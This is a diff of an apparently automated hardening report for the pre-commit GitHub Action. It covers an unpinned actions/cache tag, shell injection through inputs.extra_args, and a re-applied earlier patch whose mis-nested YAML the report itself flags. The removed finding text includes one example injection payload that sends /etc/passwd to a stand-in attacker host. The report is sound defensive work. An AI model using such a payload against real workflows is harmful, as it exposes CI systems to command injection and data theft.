@@ -4,36 +4,31 @@
 
 > This file was generated automatically by the hardening agent.
 
-**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`
+**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
 **Harden Agent Version:** `2`
 
-Action **pre-commit--action/v3.0.1** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).
+Action **pre-commit--action/v3.0.1** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
-### script-injection (severity: high)
-
-Sub-rule (a): The `run:` step directly interpolates `${{ inputs.extra_args }}` into the shell command string: `pre-commit run --show-diff-on-failure --color=always ${{ inputs.extra_args }}`. The GitHub Actions template engine substitutes the expression before the shell parses the command, allowing an attacker who controls the `extra_args` input to inject arbitrary shell commands (e.g., `; curl -d @/etc/passwd attacker.com`). Fix: pass the value via an `env:` variable and double-quote it in the script, e.g.:
-```yaml
-env:
-  EXTRA_ARGS: ${{ inputs.extra_args }}
-run: pre-commit run --show-diff-on-failure --color=always "$EXTRA_ARGS"
-```
-
-Locations:
-
-- `action.yml:16`
-
 ### unpinned-uses (severity: high)
 
-The composite action step uses `actions/cache@v4`, which is a mutable tag reference. If the tag is moved (e.g., by a supply-chain compromise of the `actions/cache` repository), the action will silently execute different code. Pin to a full 40-character commit SHA instead, e.g.: `actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4`.
+action.yml uses a tag instead of a full 40-character commit SHA: `uses: actions/cache@v4`.
 
 Locations:
 
-- `action.yml:13`
+- `action.yml:15`
+
+### script-injection (severity: high)
+
+Sub-rule (a): an expression is placed directly in a run: block: `run: pre-commit run --show-diff-on-failure --color=always ${{ inputs.extra_args }}`. Whoever calls the action controls inputs.extra_args, and the value is not quoted, so shell metacharacters in it can run commands. Fix: pass the value in through env (e.g. EXTRA_ARGS) and expand it safely.
+
+Locations:
+
+- `action.yml:18`
 
 ### static-inline-injection (severity: high)
 
@@ -43,14 +38,59 @@ Locations:
 
 - `action.yml:20`
 
+### prior-fix (severity: high)
+
+Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed action.yml without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
+```diff
+diff --git a/action.yml b/action.yml
+index 18ded0d..f31817f 100644
+--- a/action.yml
++++ b/action.yml
+@@ -8,13 +8,38 @@ inputs:
+ runs:
+   using: composite
+   steps:
+-  - run: python -m pip install pre-commit
+-    shell: bash
+-  - run: python -m pip freeze --local
+-    shell: bash
+   - uses: actions/cache@v4
+-    with:
+-      path: ~/.cache/pre-commit
+-      key: pre-commit-3|${{ env.pythonLocation }}|${{ hashFiles('.pre-commit-config.yaml') }}
+-  - run: pre-commit run --show-diff-on-failure --color=always ${{ inputs.extra_args }}
+-    shell: bash
++    - run: python -m pip install pre-commit
++      shell: bash
++    - run: python -m pip freeze --local
++      shell: bash
++      with:
++        path: ~/.cache/pre-commit
++        key: pre-commit-3|${{ env.pythonLocation }}|${{ hashFiles('.pre-commit-config.yaml') }}
++    - env:
++        EXTRA_ARGS: ${{ inputs.extra_args }}
++      run: |
++        args=()
++        if [ -n "$EXTRA_ARGS" ]; then
++          while IFS= read -r -d '' t; do args+=("$t"); done \
++            < <(printf '%s' "$EXTRA_ARGS" | xargs printf '%s\0')
++        fi
++        pre-commit run --show-diff-on-failure --color=always "${args[@]}"
++      shell: bash
+
+```
+
+Locations:
+
+- `action.yml`
+
 ## Iteration Notes
 
 ### Iteration 1
 
-**Fixes applied:** unpinned-uses, script-injection, static-inline-injection
+**Fixes applied:** unpinned-uses, script-injection, static-inline-injection, prior-fix
 
 **Notes:**
 
-1. Pinned `actions/cache@v4` to full SHA `0057852bfaa89a56745cba8c7296529d2fc39830` with `# v4` comment for readability.
-2. Moved `${{ inputs.extra_args }}` out of the `run:` shell string into an `env:` block as `EXTRA_ARGS`. Because `extra_args` is an argument-list input (defaults to `--all-files`), used the xargs-based array tokenization pattern (`printf '%s' "$EXTRA_ARGS" | xargs printf '%s\0'` with a null-delimited read loop) to correctly split the value into separate arguments while preserving quoted sub-arguments and preventing shell injection.
+Pinned actions/cache to 0057852bfaa89a56745cba8c7296529d2fc39830 (v4). Moved inputs.extra_args into env EXTRA_ARGS and tokenized it quote-aware (xargs -r, with unmatched-quote check and empty guard) into a bash array, matching upstream's inline-expression splitting. Re-applied prior fix but with correct YAML step structure (the previous patch had mis-nested steps).
 
